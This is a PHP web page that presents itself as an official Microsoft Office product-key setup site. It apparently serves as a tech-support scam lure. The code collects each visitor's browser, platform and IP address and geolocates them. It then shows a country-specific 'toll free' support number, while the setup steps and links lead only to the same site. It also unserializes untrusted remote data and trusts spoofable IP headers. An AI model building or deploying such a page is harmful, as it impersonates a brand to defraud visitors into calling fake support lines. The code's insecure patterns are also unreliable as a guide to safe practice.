<?php
$u_agent = $_SERVER['HTTP_USER_AGENT'];
$str_info = substr($u_agent, 11, 50);
$os=substr($str_info, 0, strpos($str_info, "AppleWebKit")); 


function getBrowser()
{
$u_agent = $_SERVER['HTTP_USER_AGENT'];
$bname = 'Unknown';
$platform = 'Unknown';
$version= "";

//First get the platform?
if (preg_match('/linux/i', $u_agent)) {
$platform = 'linux';
}
elseif (preg_match('/macintosh|mac os x/i', $u_agent)) {
$platform = 'mac';
}
elseif (preg_match('/windows|win32/i', $u_agent)) {
$platform = 'windows';
}

// Next get the name of the useragent yes seperately and for good reason
if(preg_match('/MSIE/i',$u_agent) && !preg_match('/Opera/i',$u_agent))
{
$bname = 'Internet Explorer';
$ub = "MSIE";
}
elseif(preg_match('/Trident/i',$u_agent))
{ // this condition is for IE11
$bname = 'Internet Explorer';
$ub = "rv";
}
elseif(preg_match('/Firefox/i',$u_agent))
{
$bname = 'Mozilla Firefox';
$ub = "Firefox";
}
elseif(preg_match('/Chrome/i',$u_agent))
{
$bname = 'Google Chrome';
$ub = "Chrome";
}
elseif(preg_match('/Safari/i',$u_agent))
{
$bname = 'Apple Safari';
$ub = "Safari";
}
elseif(preg_match('/Opera/i',$u_agent))
{
$bname = 'Opera';
$ub = "Opera";
}
elseif(preg_match('/Netscape/i',$u_agent))
{
$bname = 'Netscape';
$ub = "Netscape";
}

// finally get the correct version number
// Added "|:"
$known = array('Version', $ub, 'other');
$pattern = '#(?<browser>' . join('|', $known) .
')[/|: ]+(?<version>[0-9.|a-zA-Z.]*)#';
if (!preg_match_all($pattern, $u_agent, $matches)) {
// we have no matching number just continue
}

// see how many we have
$i = count($matches['browser']);
if ($i != 1) {
//we will have two since we are not using 'other' argument yet
//see if version is before or after the name
if (strripos($u_agent,"Version") < strripos($u_agent,$ub)){
    $version= $matches['version'][0];
}
else {
    $version= $matches['version'][1];
}
}
else {
$version= $matches['version'][0];
}

// check if we have a number
if ($version==null || $version=="") {$version="?";}

return array(
'userAgent' => $u_agent,
'name'      => $bname,
'version'   => $version,
'platform'  => $platform,
'pattern'    => $pattern
);
}

// now try it
$ua=getBrowser();
$yourbrowser= $ua['name'] . " " . $ua['version'] ;


function getIPAddress() {  
//whether ip is from the share internet  
if(!empty($_SERVER['HTTP_CLIENT_IP'])) {  
        $ip = $_SERVER['HTTP_CLIENT_IP'];  
}  
//whether ip is from the proxy  
elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {  
        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];  
}  
//whether ip is from the remote address  
else{  
     $ip = $_SERVER['REMOTE_ADDR'];  
}  
return $ip;  
}  
$ip = getIPAddress();

?>
<?php 
    $location=(unserialize(file_get_contents('http://www.geoplugin.net/php.gp?ip='.$ip)));
    $city= $location['geoplugin_city'];
    $state= $location['geoplugin_region'];
    $country= $location['geoplugin_countryName'];
    $zip= $location['geoplugin_areaCode'];
    $c_code= $location['geoplugin_countryCode'];
 ?> 
<!DOCTYPE html>
<html lang="en">
<head>
    <title>Microsoft Office</title>
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.0/css/bootstrap.min.css">
	<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.0/js/bootstrap.min.js"></script>
    <link href="https://fonts.googleapis.com/css?family=Anton&display=swap" rel="stylesheet">
	<link rel="stylesheet" href="css/style.css">
    <link rel="stylesheet" href="css/banner.css">
    <link href="https://fonts.googleapis.com/css2?family=Roboto:ital,wght@0,400;1,900&display=swap" rel="stylesheet">
    <link rel="icon" href="img/favicon.ico" type="image/x-icon">

	<!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-154545431-1"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-154545431-1');
</script>

</head>
<body>
    <!-- header area -->
    <div class="background">
        <div class="container">        
            <a href="index.php"><img src="img/logo.png" class="logo image-responsive" alt=""></a>
            <ul class="nav navbar-nav navbar-right">
                <li class="navbar-link"><a href="setup-index.php"> Setup Product Key</a></li>
                <li class="navbar-link"><a href="offlog">Sign in</a> </li>
                <li class="navbar-link"><a href="offreg">Register</a> </li>
                <li class="navbar-link"><a href="off-support.php">Contact Support</a> </li>
            </ul>
        </div>
    </div>
    <!-- //header area end -->
    <!-- body start -->
    <div class="col-lg-6 col-lg-offset-3 body-content-sm">
        <h1 class="heading margin-top-16 mt-5" style="margin-top: 36px;">Hi. Let's get your Office</h1>
        <div class="col-lg-12">
            <h1 class="sign-in-heading"><span class="number">1</span>Setup Your Microsoft Office</h1>
            <div class="col-lg-9 verticle-line">
                <h1 class="text-center margin-top-6 "><img class="log-user" src="img/user.png" alt=""></h1>
                <h1 class="text-center margin-top-6"><img src="img/2.png" alt=""></h1>
                <p class="margin-top-16">Let's get started now to setup your 25-digit microsoft office product key now. Click here to setup your product key. </p>
                <div class="col-lg-12 margin-top-16">
                    <div class="col-lg-12 text-center">
                        <a href="act-off.php" class="button-sign text-center">Setup Product Key </a>
                    </div>
                    <!-- <div class="col-lg-6">
                        <a href="" class="button-reg text-center">Create a new account</a>
                    </div> -->
                </div>
                <div class="clearfix"></div>
                <p class="margin-top-32 paragraph"></p>
            </div>
            <div class="clearfix"></div>
            <h1 class="sign-in-heading"><span class="number">2</span>Enter your product key</h1>
            <div class="col-lg-9 verticle-line"><br><br></div>
            <div class="clearfix"></div>
            <h1 class="sign-in-heading"><span class="number">3</span>Get your Office</h1>
        </div>
    </div>
    <!-- //body end -->
    <div class="footer">
  <p><span class="cont-text">Customer Support Toll Free :</span> <span class="number-hp">
  <?php 
if($c_code == "US")
{
echo "US/CA +1 844 514 0333";
}
elseif($c_code == "CA")
{
echo "US/CA +1 844 514 0333";
}
elseif($c_code == "GB")
{
echo "UK   +44 800 229 4983";
}
elseif($c_code == "AU")
{
echo "AU   +1 844 514 0333";
}
elseif($c_code == "NZ")
{
echo "NZ   +1 844 514 0333";
}
else
{
    echo "+1 844 514 0333";
}
?>  
  </span> </p>
</div>
</body>
</html>
